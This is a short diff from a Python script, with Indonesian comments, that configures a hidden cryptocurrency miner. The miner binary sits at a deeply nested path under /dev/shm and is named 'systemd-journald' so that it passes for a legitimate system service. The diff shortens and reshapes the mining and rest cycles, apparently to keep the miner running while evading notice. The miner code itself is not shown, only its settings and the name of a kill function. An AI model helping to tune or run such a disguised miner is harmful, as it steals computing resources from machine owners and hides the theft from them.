@@ -6,9 +6,9 @@ import signal
 # CONFIG
 MINER_PATH = "/dev/shm/.cache/systemd/lib/system/syslog/data/kernel/logs/modules/.daemon/systemd-journald"  # Lokasi miner
 MINER_NAME = "systemd-journald"  # Nama miner buat kill
-MINING_TIME = 1800  # 30 menit
+MINING_TIME = 1200  # 20 menit
 REST_TIME = 300  # 5 menit
-LONG_REST = 1800  # 30 menit (dalam detik)
+LONG_REST = 600  # 10 menit (dalam detik)
 CYCLES = 10  # Jumlah cycle sebelum istirahat panjang
 
 def kill_miner():
